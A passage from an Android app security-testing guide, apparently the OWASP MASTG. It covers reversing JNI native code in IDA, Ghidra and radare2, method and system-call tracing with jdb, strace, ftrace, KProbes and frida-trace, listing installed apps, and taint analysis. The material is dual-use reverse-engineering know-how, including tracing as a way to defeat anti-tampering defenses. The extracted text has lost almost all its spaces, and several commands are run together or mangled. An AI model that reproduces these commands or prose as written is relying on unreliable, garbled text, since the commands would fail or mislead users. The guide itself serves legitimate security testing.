function tojumptoitsaddressinthedisassemblyWindow. “IdaView-A”shouldnowshowthedisassemblyofthefunction. Notalotofcodethere,butyoushouldanalyzeit. Thefirstthingyouneedtoknowisthatthefirstargumentpassedto everyJNIfunctionisaJNIinterfacepointer. Aninterfacepointerisapointertoapointer. Thispointerpointstoafunction table: anarrayofevenmorepointers,eachofwhichpointstoaJNIinterfacefunction(isyourheadspinningyet?). The functiontableisinitializedbytheJavaVMandallowsthenativefunctiontointeractwiththeJavaenvironment. Withthatinmind,let’shavealookateachlineofassemblycode. 172\nLDR R2,[R0] Remember: thefirstargument(inR0)isapointertotheJNIfunctiontablepointer. TheLDRinstructionloadsthisfunction tablepointerintoR2. LDR R1,=aHelloFromC ThisinstructionloadsintoR1thePC-relativeoffsetofthestring“HellofromC++”. Notethatthisstringcomesdirectly after the end of the function block at offset 0xe84. Addressing relative to the program counter allows the code to run independentlyofitspositioninmemory. LDR.W R2,[R2,#0x29C] Thisinstructionloadsthefunctionpointerfromoffset0x29CintotheJNIfunctionpointertablepointedtobyR2. Thisis theNewStringUTFfunction. Youcanlookatthelistoffunctionpointersinjni.h,whichisincludedintheAndroidNDK.The functionprototypelookslikethis: jstring (*NewStringUTF)(JNIEnv*,const char*); Thefunctiontakestwoarguments: theJNIEnvpointer(alreadyinR0)andaStringpointer. Next,thecurrentvalueofPC isaddedtoR1,resultingintheabsoluteaddressofthestaticstring“HellofromC++”(PC+offset). ADD R1,PC Finally,theprogramexecutesabranchinstructiontotheNewStringUTFfunctionpointerloadedintoR2: BX R2 Whenthisfunctionreturns,R0containsapointertothenewlyconstructedUTFstring. Thisisthefinalreturnvalue,soR0 isleftunchangedandthefunctionreturns. Ghidra AfteropeningthelibraryinGhidrawecanseeallthefunctionsdefinedintheSymbolTreepanelunderFunctions. The nativelibraryforthecurrentapplicationisrelativelyverysmall. Therearethreeuserdefinedfunctions: FUN_001004d0, FUN_0010051c,andJava_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI.Theothersymbolsarenot userdefinedandaregeneratedforproperfunctioningofthesharedlibrary. TheinstructionsinthefunctionJava_sg_- vantagepoint_helloworldjni_MainActivity_stringFromJNI are already discussed in detail in previous sections. In thissectionwecanlookintothedecompilationofthefunction. Inside the current function there is a call to another function, whose address is obtained by accessing an offset in the JNIEnvpointer(foundasplParm1). Thislogichasbeendiagrammaticallydemonstratedaboveaswell. Thecorresponding CcodeforthedisassembledfunctionisshownintheDecompilerwindow. ThisdecompiledCcodemakesitmucheasier tounderstandthefunctioncallbeingmade. Sincethisfunctionissmallandextremelysimple,thedecompilationoutput isveryaccurate,thiscanchangedrasticallywhendealingwithcomplexfunctions. 173\nDisassembling Native Code Platform: android Dalvik and ART both support the Java Native Interface (JNI), which defines a way for Java code to interact with native codewritteninC/C++. AsonotherLinux-basedoperatingsystems,nativecodeispackaged(compiled)intoELFdynamic libraries (*.so), which the Android app loads at runtime via the System.load method. However, instead of relying on widelyusedClibraries(suchasglibc),AndroidbinariesarebuiltagainstacustomlibcnamedBionic. Bionicaddssupport forimportantAndroid-specificservicessuchassystempropertiesandlogging,anditisnotfullyPOSIX-compatible. WhenreversinganAndroidapplicationcontainingnativecode,weneedtounderstandacoupleofdatastructuresrelated totheJNIbridgebetweenJavaandnativecode. Fromthereversingperspective, weneedtobeawareoftwokeydata structures: JavaVMandJNIEnv. Bothofthemarepointerstopointerstofunctiontables: • JavaVM provides an interface to invoke functions for creating and destroying a JavaVM. Android allows only one JavaVMperprocessandisnotreallyrelevantforourreversingpurposes. • JNIEnvprovidesaccesstomostoftheJNIfunctionswhichareaccessibleatafixedoffsetthroughtheJNIEnvpointer. ThisJNIEnvpointeristhefirstparameterpassedtoeveryJNIfunction. Wewilldiscussthisconceptagainwiththe helpofanexamplelaterinthischapter. ItisworthhighlightingthatanalyzingdisassemblednativecodeismuchmorechallengingthandisassembledJavacode. WhenreversingthenativecodeinanAndroidapplicationwewillneedadisassembler. Inthenextexamplewe’llreversetheHelloWorld-JNI.apkfromtheOWASPMASTGrepository. Installingandrunningitin anemulatororAndroiddeviceisoptional. wget https://github.com/OWASP/owasp-mastg/raw/master/Samples/Android/01_HelloWorld-JNI/HelloWord-JNI.apk Thisappisnotexactlyspectacular,allitdoesisshowalabelwiththetext“HellofromC++”. ThisistheappAndroid generatesbydefaultwhenyoucreateanewprojectwithC/C++support, whichisjustenoughtoshowthebasic principlesofJNIcalls. 174\nDecompiletheAPKwithapkx. $apkxHelloWord-JNI.apk ExtractingHelloWord-JNI.apktoHelloWord-JNI Converting:classes.dex ->classes.jar (dex2jar) dex2jarHelloWord-JNI/classes.dex ->HelloWord-JNI/classes.jar DecompilingtoHelloWord-JNI/src (cfr) ThisextractsthesourcecodeintotheHelloWord-JNI/srcdirectory. ThemainactivityisfoundinthefileHelloWord-JNI/ src/sg/vantagepoint/helloworldjni/MainActivity.java. The“HelloWorld”textviewispopulatedintheonCreate method: public class MainActivity extends AppCompatActivity { static { System.loadLibrary("native-lib"); } @Override protected void onCreate(Bundlebundle){ super.onCreate(bundle); this.setContentView(2130968603); ((TextView)this.findViewById(2131427422)).setText((CharSequence)this. \ stringFromJNI()); } public native String stringFromJNI(); } NotethedeclarationofpublicnativeStringstringFromJNIatthebottom. Thekeyword“native”tellstheJavacompiler thatthismethodisimplementedinanativelanguage. Thecorrespondingfunctionisresolvedduringruntime,butonlyif anativelibrarythatexportsaglobalsymbolwiththeexpectedsignatureisloaded(signaturescompriseapackagename, classname,andmethodname). Inthisexample,thisrequirementissatisfiedbythefollowingCorC++function: JNIEXPORTjstringJNICALLJava_sg_vantagepoint_helloworld_MainActivity_stringFromJNI(JNIEnv *env,jobject) Sowhereisthenativeimplementationofthisfunction? Ifyoulookintothe“lib”directoryoftheunzippedAPKarchive, you’ll see several subdirectories (one per supported processor architecture), each of them containing a version of the nativelibrary,inthiscaselibnative-lib.so. WhenSystem.loadLibraryiscalled,theloaderselectsthecorrectversion basedonthedevicethattheappisrunningon. Beforemovingahead,payattentiontothefirstparameterpassedtothe currentJNIfunction. ItisthesameJNIEnvdatastructurewhichwasdiscussedearlierinthissection. 175\nFollowing the naming convention mentioned above, you can expect the library to export a symbol called Java_sg_- vantagepoint_helloworld_MainActivity_stringFromJNI.OnLinuxsystems,youcanretrievethelistofsymbolswith readelf(includedinGNUbinutils)ornm. DothisonmacOSwiththegreadelftool,whichyoucaninstallviaMacportsor Homebrew. Thefollowingexampleusesgreadelf: $greadelf -W-slibnative-lib.so |grep Java 3:00004e49 112FUNC GLOBALDEFAULT 11Java_sg_vantagepoint_helloworld_MainActivity_stringFromJNI Youcanalsoseethisusingradare2’srabin2: $rabin2 -sHelloWord-JNI/lib/armeabi-v7a/libnative-lib.so |grep -iJava 0030x00000e780x00000e78GLOBAL FUNC 16Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI ThisisthenativefunctionthateventuallygetsexecutedwhenthestringFromJNInativemethodiscalled. Todisassemblethecode,youcanloadlibnative-lib.sointoanydisassemblerthatunderstandsELFbinaries(i.e.,any disassembler). Iftheappshipswithbinariesfordifferentarchitectures,youcantheoreticallypickthearchitectureyou’re mostfamiliarwith,aslongasitiscompatiblewiththedisassembler. Eachversioniscompiledfromthesamesourceand implements the same functionality. However, if you’re planning to debug the library on a live device later, it’s usually wisetopickanARMbuild. To support both older and newer ARM processors, Android apps ship with multiple ARM builds compiled for different ApplicationBinaryInterface(ABI)versions. TheABIdefineshowtheapplication’smachinecodeissupposedtointeract withthesystematruntime. ThefollowingABIsaresupported: • armeabi: ABIisforARM-basedCPUsthatsupportatleasttheARMv5TEinstructionset. • armeabi-v7a: ThisABIextendsarmeabitoincludeseveralCPUinstructionsetextensions. • arm64-v8a: ABIforARMv8-basedCPUsthatsupportAArch64,thenew64-bitARMarchitecture. Mostdisassemblerscanhandleanyofthosearchitectures. Below,we’llbeviewingthearmeabi-v7aversion(locatedin HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so)inradare2andinIDAPro. Seethesection“ReviewingDisassem- bledNativeCode”belowtolearnonhowtoproceedwheninspectingthedisassemblednativecode. radare2 Toopenthefileinradare2youonlyhavetorunr2-AHelloWord-JNI/lib/armeabi-v7a/libnative-lib.so. Thechapter “Android Basic Security Testing” already introduced radare2. Remember that you can use the flag -A to run the aaa commandrightafterloadingthebinaryinordertoanalyzeallreferencedcode. $r2 -AHelloWord-JNI/lib/armeabi-v7a/libnative-lib.so [x]Analyzeallflagsstartingwithsym.andentry0 (aa) [x]Analyzefunctioncalls (aac) [x]Analyzelenbytesofinstructionsforreferences (aar) [x]Checkforobjcreferences 176\n[x]Checkforvtables [x]Findingxrefsinnoncodesectionwithanal.in=io.maps [x]Analyzevaluepointers (aav) [x]Valuefrom0x00000000to0x00001dcf (aav) [x]0x00000000-0x00001dcfin0x0-0x1dcf (aav) [x]Emulatecodetofindcomputedreferences (aae) [x]Typematchinganalysisforallfunctions (aaft) [x]Use -AAoraaaatoperformadditionalexperimentalanalysis. --Printthecontentsofthecurrentblockwiththe 'p'command [0x00000e3c]> Note that for bigger binaries, starting directly with the flag -A might be very time consuming as well as unnecessary. Dependingonyourpurpose,youmayopenthebinarywithoutthisoptionandthenapplyalesscomplexanalysislikeaa oramoreconcretetypeofanalysissuchastheonesofferedinaa(basicanalysisofallfunctions)oraac(analyzefunction calls). Remembertoalwaystype? togetthehelporattachittocommandstoseeevenmorecommandoroptions. For example,ifyouenteraa? you’llgetthefulllistofanalysiscommands. [0x00001760]>aa? Usage:aa[0*?] #seealso'af'and'afna' |aa aliasfor 'af@@sym.*;af@entry0;afva' |aaa[?] autonamefunctionsafteraa (seeafna) |aab abbacrossbin.sections.rx |aac[len] analyzefunctioncalls (af@@ `pilen~call[1]`) |aac* [len] flagfunctioncallswithoutperformingacompleteanalysis |aad[len] analyzedatareferencestocode |aae[len]([addr]) analyzereferenceswithESIL (optionallytoaddress) |aaf[e|t] analyzeallfunctions (eanal.hasnext=1;afr@@c:isq)(aafe=aef@@f) |aaF[sym*] setanal.in=blockforallthespacesbetweenflagsmatchingglob |aaFa [sym*] sameasaaFbutusesaf/a2finsteadofaf+/afb+ (slowerbutmoreaccurate) |aai[j] showinfoofallanalysisparameters |aan autonamefunctionsthateitherstartwithfcn.*orsym.func.* |aang findfunctionandsymbolnamesfromgolangbinaries |aao analyzeallobjcreferences |aap findandanalyzefunctionpreludes |aar[?][len] analyzelenbytesofinstructionsforreferences |aas[len] analyzesymbols (af@@= `isq~[0]`) |aaS analyzeallflagsstartingwithsym. (af@@sym.*) |aat[len] analyzeallconsecutivefunctionsinsection |aaT[len] analyzecodeaftertrap-sleds |aau[len] listmemareas (largerthanlenbytes)notcoveredbyfunctions |aav[sat] findvaluesreferencingaspecificsectionormap Thereisathingthatisworthnoticingaboutradare2vsotherdisassemblerslikee.g.IDAPro. Thefollowingquotefrom thisarticleofradare2’sblog(https://radareorg.github.io/blog/)offersagoodsummary. Codeanalysisisnotaquickoperation,andnotevenpredictableortakingalineartimetobeprocessed. Thismakes startingtimesprettyheavy,comparedtojustloadingtheheadersandstringsinformationlikeit’sdonebydefault. People that are used to IDA or Hopper just load the binary, go out to make a coffee and then when the analysis isdone, they startdoingthemanualanalysis tounderstandwhattheprogramis doing. It’s truethatthosetools performtheanalysisinbackground,andtheGUIisnotblocked. ButthistakesalotofCPUtime,andr2aimstorun inmanymoreplatformsthanjusthigh-enddesktopcomputers. Thissaid,pleaseseesection“ReviewingDisassembledNativeCode”tolearnmorebouthowradare2canhelpusperform- ingourreversingtasksmuchfaster. Forexample,gettingthedisassemblyofaspecificfunctionisatrivialtaskthatcan beperformedinonecommand. IDA Pro IfyouownanIDAProlicense,openthefileandonceinthe“Loadnewfile”dialog,choose“ELFforARM(SharedObject)” asthefiletype(IDAshoulddetectthisautomatically),and“ARMLittle-Endian”astheprocessortype. 177\nThefreewareversionofIDAProunfortunatelydoesnotsupporttheARMprocessortype. Execution Tracing Platform: android Besides being useful for debugging, the jdb command line tool offers basic execution tracing functionality. To trace an apprightfromthestart,youcanpausetheappwiththeAndroid“WaitforDebugger”featureorakill -STOPcommand andattachjdbtosetadeferredmethodbreakpointonanyinitializationmethod. Oncethebreakpointisreached,activate methodtracingwiththetrace go methodscommandandresumeexecution. jdbwilldumpallmethodentriesandexits fromthatpointonwards. $adbforwardtcp:7777jdwp:7288 ${echo "suspend";cat;}|jdb-attach localhost:7777 Setuncaughtjava.lang.Throwable Setdeferreduncaughtjava.lang.Throwable Initializingjdb... >Allthreadssuspended. >stop incom.acme.bob.mobile.android.core.BobMobileApplication.<clinit>() Deferringbreakpointcom.acme.bob.mobile.android.core.BobMobileApplication.<clinit>(). Itwillbesetaftertheclassisloaded. >resume Allthreadsresumed.M Setdeferredbreakpointcom.acme.bob.mobile.android.core.BobMobileApplication.<clinit>() Breakpointhit: "thread=main",com.acme.bob.mobile.android.core.BobMobileApplication.<clinit>(),line=44 bci=0 main[1]tracegomethods main[1]resume Methodentered:Allthreadsresumed. The Dalvik Debug Monitor Server (DDMS) is a GUI tool included with Android Studio. It may not look like much, but its Javamethodtracerisoneofthemostawesometoolsyoucanhaveinyourarsenal,anditisindispensableforanalyzing obfuscatedbytecode. DDMS is somewhat confusing, however; it can be launched several ways, and different trace viewers will be launched depending on how a method was traced. There’s a standalone tool called “Traceview” as well as a built-in viewer in AndroidStudio,bothofwhichofferdifferentwaystonavigatethetrace. You’llusuallyuseAndroidstudio’sbuilt-inviewer, whichgivesyouazoomablehierarchicaltimelineofallmethodcalls. However,thestandalonetoolisalsouseful,ithasa profilepanelthatshowsthetimespentineachmethodalongwiththeparentsandchildrenofeachmethod. TorecordanexecutiontraceinAndroidStudio,opentheAndroidtabatthebottomoftheGUI.Selectthetargetprocess inthelistandclickthelittlestopwatchbuttonontheleft. Thisstartstherecording. Onceyou’redone,clickthesame buttontostoptherecording. Theintegratedtraceviewwillopenandshowtherecordedtrace. Youcanscrollandzoom thetimelineviewwiththemouseortrackpad. ExecutiontracescanalsoberecordedinthestandaloneAndroidDeviceMonitor. TheDeviceMonitorcanbestartedwithin AndroidStudio(Tools->Android->AndroidDeviceMonitor)orfromtheshellwiththeddmscommand. To start recording tracing information, select the target process in the Devices tab and click Start Method Profiling. Clickthestopbuttontostoprecording,afterwhichtheTraceviewtoolwillopenandshowtherecordedtrace. Clicking anyofthemethodsintheprofilepanelhighlightstheselectedmethodinthetimelinepanel. 178\nDDMSalsooffersaconvenientheapdumpbuttonthatwilldumptheJavaheapofaprocesstoa.hproffile. TheAndroid StudiouserguidecontainsmoreinformationaboutTraceview. Tracing System Calls MovingdownalevelintheOShierarchy, youarriveatprivilegedfunctionsthatrequirethepowersoftheLinuxkernel. Thesefunctionsareavailabletonormalprocessesviathesystemcallinterface. Instrumentingandinterceptingcallsinto thekernelisaneffectivemethodforgettingaroughideaofwhatauserprocessisdoing, andoftenthemostefficient waytodeactivatelow-leveltamperingdefenses. Strace is a standard Linux utility that is not included with Android by default, but can be easily built from source via theAndroidNDK.Itmonitorstheinteractionbetweenprocessesandthekernel,beingaveryconvenientwaytomonitor systemcalls. However,there’sadownside: asstracedependsontheptracesystemcalltoattachtothetargetprocess, onceanti-debuggingmeasuresbecomeactiveitwillstopworking. Ifthe“Waitfordebugger”featureinSettings>Developeroptionsisunavailable,youcanuseashellscripttolaunch theprocessandimmediatelyattachstrace(notanelegantsolution,butitworks): while true;dopid=$(pgrep 'target_process' |head -1);if[[-n"$pid"]];then strace -s2000 -e"!read" -ff-p"$pid";break;fi;done Ftrace FtraceisatracingutilitybuiltdirectlyintotheLinuxkernel. Onarooteddevice,ftracecantracekernelsystemcallsmore transparentlythanstracecan(stracereliesontheptracesystemcalltoattachtothetargetprocess). Conveniently,thestockAndroidkernelonbothLollipopandMarshmallowincludeftracefunctionality. Thefeaturecanbe enabledwiththefollowingcommand: echo1 >/proc/sys/kernel/ftrace_enabled The /sys/kernel/debug/tracing directory holds all control and output files related to ftrace. The following files are foundinthisdirectory: • available_tracers: Thisfileliststheavailabletracerscompiledintothekernel. • current_tracer: Thisfilesetsordisplaysthecurrenttracer. • tracing_on: Echo “1”intothis filetoallow/start updateofthe ringbuffer. Echoing“0”will preventfurtherwrites intotheringbuffer. KProbes TheKProbesinterfaceprovidesanevenmorepowerfulwaytoinstrumentthekernel: itallowsyoutoinsertprobesinto (almost)arbitrarycodeaddresseswithinkernelmemory. KProbesinsertsabreakpointinstructionatthespecifiedaddress. Once the breakpoint is reached, control passes to the KProbes system, which then executes the user-defined handler function(s) and the original instruction. Besides being great for function tracing, KProbes can implement rootkit-like functionality,suchasfilehiding. JprobesandKretprobesareotherKProbes-basedprobetypesthatallowhookingoffunctionentriesandexits. The stock Android kernel comes without loadable module support, which is a problem because Kprobes are usually de- ployedaskernelmodules. ThestrictmemoryprotectiontheAndroidkerneliscompiledwithisanotherissuebecauseit preventsthepatchingofsomepartsofKernelmemory. Elfmaster’ssystemcallhookingmethodcausesaKernelpanicon stockLollipopandMarshmallowbecausethesys_call_tableisnon-writable. Youcan,however,useKProbesinasandbox bycompilingyourown,morelenientKernel(moreonthislater). Information Gathering - API Usage 179\nPlatform: android TheAndroidplatformprovidesmanyin-builtlibrariesforfrequentlyusedfunctionalitiesinapplications,forexamplecryp- tography,Bluetooth,NFC,networkorlocationlibraries. Determiningthepresenceoftheselibrariesinanapplicationcan giveusvaluableinformationaboutitsnature. Forinstance,ifanapplicationisimportingjavax.crypto.Cipher,itindicatesthattheapplicationwillbeperformingsome kindofcryptographicoperation. Fortunately,cryptographiccallsareverystandardinnature,i.e,theyneedtobecalled inaparticularordertoworkcorrectly,thisknowledgecanbehelpfulwhenanalyzingcryptographyAPIs. Forexample,by lookingfortheCipher.getInstancefunction,wecandeterminethecryptographicalgorithmbeingused. Withsuchan approachwecandirectlymovetoanalyzingcryptographicassets,whichoftenareverycriticalinanapplication. Further informationonhowtoanalyzeAndroid’scryptographicAPIsisdiscussedinthesection“AndroidCryptographicAPIs”. Similarly, the above approach can be used to determine where and how an application is using NFC. For instance, an applicationusingHost-basedCardEmulationforperformingdigitalpaymentsmustusetheandroid.nfcpackage. There- fore, agoodstartingpointforNFCAPIanalysiswouldbetoconsulttheAndroidDeveloperDocumentationtogetsome ideas and start searching for critical functions such as processCommandApdu from the android.nfc.cardemulation. HostApduServiceclass. Retrieving Cross References Platform: android Java and Kotlin There are many RE tools that support retrieving Java cross references. For many of the GUI-based ones, this is usually donebyrightclickingonthedesiredfunctionandselectingthecorrespondingoption,e.g.ShowReferencestoinGhidra orFindUsageinjadx. Native Code SimilarlytoJavaanalysis,youcanalsouseGhidratoanalyzenativelibrariesandobtaincrossreferencesbyrightclicking thedesiredfunctionandselectingShowReferencesto. Method Tracing Platform: android Incontrasttomethodprofiling,whichtellsyouhowfrequentlyamethodisbeingcalled,methodtracinghelpsyoutoalso determine its input and output values. This technique can prove to be very useful when dealing with applications that haveabigcodebaseand/orareobfuscated. As we will discuss shortly in the next section, frida-trace offers out-of-the-box support for Android/iOS native code tracingandiOShighlevelmethodtracing. IfyoupreferaGUI-basedapproachyoucanusetoolssuchasRMS-Runtime MobileSecuritywhichenablesamorevisualexperienceaswellasincludeseveralconveniencetracingoptions. Get Open Files Platform: android Youcanuselsofwiththeflag-p <pid>toreturnthelistofopenfilesforthespecifiedprocess. Seethemanpagefor moreoptions. 180\n##lsof-p6233 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODENAME .foobar.c 6233 u0_a97 cwd DIR 0,1 0 1/ .foobar.c 6233 u0_a97 rtd DIR 0,1 0 1/ .foobar.c 6233 u0_a97 txt REG 259,11 23968 399/system/bin/app_process64 .foobar.c 6233 u0_a97 mem unknown /dev/ashmem/dalvik-mainspace (regionspace)(deleted) .foobar.c 6233 u0_a97 mem REG 253,0 2797568 1146914/data/dalvik-cache/arm64/system@framework@boot.art .foobar.c 6233 u0_a97 mem REG 253,0 1081344 1146915/data/dalvik-cache/arm64/system@framework@boot-core-libart.art ... Intheaboveoutput,themostrelevantfieldsforusare: • NAME:pathofthefile. • TYPE:typeofthefile,forexample,fileisadirectoryoraregularfile. Thiscanbeextremelyusefultospotunusualfileswhenmonitoringapplicationsusingobfuscationorotheranti-reverse engineeringtechniques,withouthavingtoreversethecode. Forinstance,anapplicationmightbeperformingencryption- decryptionofdataandstoringitinafiletemporarily. Disassembling Code to Smali Platform: android Ifyouwanttoinspecttheapp’ssmalicode(insteadofJava),youcanopenyourAPKinAndroidStudiobyclickingProfile ordebugAPKfromthe“Welcomescreen”(evenifyoudon’tintendtodebugityoucantakealookatthesmalicode). Alternatively you can use apktool to extract and disassemble resources directly from the APK archive and disassemble Javabytecodetosmali. apktoolallowsyoutoreassemblethepackage,whichisusefulforpatchingtheapporapplying changestoe.g.theAndroidManifest. Native Code Tracing Platform: android Native methods tracing can be performed with relative ease compared to Java method tracing. frida-trace is a CLI toolfordynamicallytracingfunctioncalls. Itmakestracingnativefunctionstrivialandcanbeveryusefulforcollecting informationaboutanapplication. Inordertousefrida-trace,aFridaservershouldberunningonthedevice. Anexamplefortracinglibc’sopenfunction using frida-trace is demonstrated below, where -U connects to the USB device and -i specifies the function to be includedinthetrace. frida-trace -U-i"open" com.android.chrome 181\nNotehow,bydefault,onlytheargumentspassedtothefunctionareshown,butnotthereturnvalues. Underthehood, frida-tracegeneratesonelittleJavaScripthandlerfilepermatchedfunctionintheauto-generated__handlers__folder, whichFridatheninjectsintotheprocess. Youcaneditthesefilesformoreadvancedusagesuchasobtainingthereturn valueofthefunctions,theirinputparameters,accessingthememory,etc. CheckFrida’sJavaScriptAPIformoredetails. Inthiscase,thegeneratedscriptwhichtracesallcallstotheopenfunctioninlibc.soislocatedin__handlers__/libc. so/open.js,itlooksasfollows: { onEnter:function (log,args,state){ log('open(' + 'path="' +args[0].readUtf8String()+'"'+ ',oflag=' +args[1]+ ')'); }, onLeave:function (log,retval,state){ log('\treturn:' +retval); \\edited } } Intheabovescript,onEntertakescareofloggingthecallstothisfunctionanditstwoinputparametersintherightformat. YoucanedittheonLeaveeventtoprintthereturnvaluesasshownabove. Note that libc is a well-known library, Frida is able to derive the input parameters of its open function and auto- maticallylogthemcorrectly. Butthiswon’tbethecaseforotherlibrariesorforAndroidKotlin/Javacode. Inthat case,youmaywanttoobtainthesignaturesofthefunctionsyou’reinterestedinbyreferringtoAndroidDevelopers 182\ndocumentationorbyreverseengineertheappfirst. Anotherthingtonoticeintheoutputaboveisthatit’scolorized. Anapplicationcanhavemultiplethreadsrunning,and each thread can call the open function independently. By using such a color scheme, the output can be easily visually segregatedforeachthread. frida-traceisaveryversatiletoolandtherearemultipleconfigurationoptionsavailablesuchas: • Including-Iandexcluding-Xentiremodules. • TracingallJNIfunctionsinanAndroidapplicationusing-i "Java_*"(notetheuseofaglob*tomatchallpossible functionsstartingwith“Java_”). • Tracingfunctionsbyaddresswhennofunctionnamesymbolsareavailable(strippedbinaries),e.g.-a "libjpeg. so!0x4793c". frida-trace -U-i"Java_*" com.android.chrome Manybinariesarestrippedanddon’thavefunctionnamesymbolsavailablewiththem. Insuchcases,afunctioncanbe tracedusingitsaddressaswell. frida-trace -p1372 -a"libjpeg.so!0x4793c" Frida12.10introducesanewusefulsyntaxtoqueryJavaclassesandmethodsaswellasJavamethodtracingsupportfor frida-tracevia-j(startingonfrida-tools8.0). • In Frida scripts: e.g. Java.enumerateMethods('*youtube*!on*') uses globs to take all classes that include “youtube”aspartoftheirnameandenumerateallmethodsstartingwith“on”. • Infrida-trace: e.g.-j '*!*certificate*/isu'triggersacase-insensitivequery(i),includingmethodsignatures (s)andexcludingsystemclasses(u). RefertotheReleaseNotesforFrida12.10formoredetailsonthisnewfeature. Tolearnmoreaboutalloptionsforadvanced usage,checkthedocumentationontheofficialFridawebsite. Information Gathering - Network Communication Platform: android Most of the apps you might encounter connect to remote endpoints. Even before you perform any dynamic analysis (e.g.trafficcaptureandanalysis),youcanobtainsomeinitialinputsorentrypointsbyenumeratingthedomainstowhich theapplicationissupposedtocommunicateto. Typicallythesedomainswillbepresentasstringswithinthebinaryoftheapplication. Onewaytoachievethisisbyusing automatedtoolssuchasAPKEnumorMobSF.Alternatively,youcangrepforthedomainnamesbyusingregularexpres- sions. Forthisyoucantargettheappbinarydirectlyorreverseengineeritandtargetthedisassembledordecompiled code. Thelatteroptionhasaclearadvantage: itcanprovideyouwithcontext,asyou’llbeabletoseeinwhichcontext eachdomainisbeingused(e.g.classandmethod). From here on you can use this information to derive more insights which might be of use later during your analysis, e.g.youcouldmatchthedomainstothepinnedcertificatesortheNetworkSecurityConfigurationfileorperformfurther reconnaissance on domain names to know more about the target environment. When evaluating an application it is importanttochecktheNetworkSecurityConfigurationfile,asoften(lesssecure)debugconfigurationsmightbepushed intofinalreleasebuildsbymistake. Theimplementationandverificationofsecureconnectionscanbeanintricateprocessandtherearenumerousaspects to consider. For instance, many applications use other protocols apart from HTTP such as XMPP or plain TCP packets, or perform certificate pinning in an attempt to deter MITM attacks but unfortunately have severe logical bugs in its implementationoraninherentlywrongsecuritynetworkconfiguration. Rememberthatinmostofthecases,justusingstaticanalysiswillnotbeenoughandmighteventurntobeextremely inefficient when compared to the dynamic alternatives which will get much more reliable results (e.g. using an inter- ceptor proxy). In this section we’ve just slightly touched the surface, please refer to the section “Basic Network Mon- itoring/Sniffing” in the “Android Basic Security Testing” chapter and also check the test cases in the “Android Network Communication”chapter. 183\nSandbox Inspection Platform: android Theapplicationdataisstoredinasandboxeddirectorypresentat/data/data/<app_package_name>. Thecontentofthis directoryhasalreadybeendiscussedindetailinthe“AccessingAppDataDirectories”section. Automated Static Analysis Platform: android Youshouldusetoolsforefficientstaticanalysis. Theyallowthetestertofocusonthemorecomplicatedbusinesslogic. A plethoraofstaticcodeanalyzersareavailable,rangingfromopensourcescannerstofull-blownenterprise-readyscanners. Thebesttoolforthejobdependsonbudget,clientrequirements,andthetester’spreferences. Somestaticanalyzersrelyontheavailabilityofthesourcecode; otherstakethecompiledAPKasinput. Keepinmind thatstaticanalyzersmaynotbeabletofindallproblemsbythemselveseventhoughtheycanhelpusfocusonpotential problems. Revieweachfindingcarefullyandtrytounderstandwhattheappisdoingtoimproveyourchancesoffinding vulnerabilities. Configurethestaticanalyzerproperlytoreducethelikelihoodoffalsepositivesandmaybeonlyselectseveralvulnerability categoriesinthescan. Theresultsgeneratedbystaticanalyzerscanotherwisebeoverwhelming,andyoureffortscan becounterproductiveifyoumustmanuallyinvestigatealargereport. ThereareseveralopensourcetoolsforautomatedsecurityanalysisofanAPK. • Androbugs • JAADAS(archived) • MobSF • QARK Listing Installed Apps Platform: android When targeting apps that are installed on the device, you’ll first have to figure out the correct package name of the applicationyouwanttoanalyze. Youcanretrievetheinstalledappseitherbyusingpm(AndroidPackageManager)orby usingfrida-ps: $adbshellpmlistpackages package:sg.vantagepoint.helloworldjni package:eu.chainfire.supersu package:org.teamsik.apps.hackingchallenge.easy package:org.teamsik.apps.hackingchallenge.hard package:sg.vp.owasp_mobile.omtg_android Youcanincludeflagstoshowonlythirdpartyapps(-3)andthelocationoftheirAPKfile(-f),whichyoucanuseafterwards todownloaditviaadb pull: $adbshellpmlistpackages -3-f package:/data/app/sg.vantagepoint.helloworldjni-1/base.apk=sg.vantagepoint.helloworldjni package:/data/app/eu.chainfire.supersu-1/base.apk=eu.chainfire.supersu package:/data/app/org.teamsik.apps.hackingchallenge.easy-1/base.apk=org.teamsik.apps.hackingchallenge.easy package:/data/app/org.teamsik.apps.hackingchallenge.hard-1/base.apk=org.teamsik.apps.hackingchallenge.hard package:/data/app/sg.vp.owasp_mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk=sg.vp.owasp_mobile.omtg_android Thisisthesameasrunningadb shell pm path <app_package_id>onanapppackageID: $adbshellpmpathsg.vp.owasp_mobile.omtg_android package:/data/app/sg.vp.owasp_mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk 184\nUsefrida-ps -Uaitogetallapps(-a)currentlyinstalled(-i)ontheconnectedUSBdevice(-U): $frida-ps -Uai PID Name Identifier ----- ---------------------------------------- --------------------------------------- 766 AndroidSystem android 21228 Attackmeifucan sg.vp.owasp_mobile.omtg_android 4281 Termux com.termux - Uncrackable1 sg.vantagepoint.uncrackable1 NotethatthisalsoshowsthePIDoftheappsthatarerunningatthemoment. Takeanoteofthe“Identifier”andthePID ifanyasyou’llneedthemafterwards. Dynamic Analysis on Android Platform: android TBD Taint Analysis Platform: android Taint analysis is an information flow analysis technique that tracks the flow of sensitive information within a program. Forexample, itcandeterminewhethergeolocationdatacollectedinanAndroidappisbeingtransmittedtothird-party domains. Intaintanalysis,dataflowsfroma“source”toa“sink”. Asourceiswheresensitiveinformationoriginates,andasinkis wherethisinformationisultimatelyutilized. Forinstance,wecandetermineifthedeviceIDretrievedbyagetDeviceId() functionistransmittedasatextmessageviaanotherfunctionsendTextMessage(). Inthisscenario,getDeviceId()is thesource,andsendTextMessage()isthesink. Ifadirectpathexistsbetweenthem,it’scalledaleak. Inlargeapplications,manualinformationflowanalysiscanbeverytimeconsumingandinaccurate. Taintanalysisauto- mates this, with two main methods: static and dynamic. The former examines code without running it, offering broad coveragebutpotentiallyyieldingfalsepositives. Incontrast,dynamicanalysisobservesreal-timeapplicationexecution, providingactualcontextbutpossiblyoverlookinguntriggeredissues. Athoroughcomparisonofthesetechniquesisbe- yondthissection’sscope. Therearemultipletoolswhichperformtaintanalysisonnativecode,includingTritonandbincat. However,inthissection, we’ll primarily focus on Android Java code and utilize FlowDroid for the taint analysis. Another notable tool supporting taintanalysisforAndroidappsisGDA. 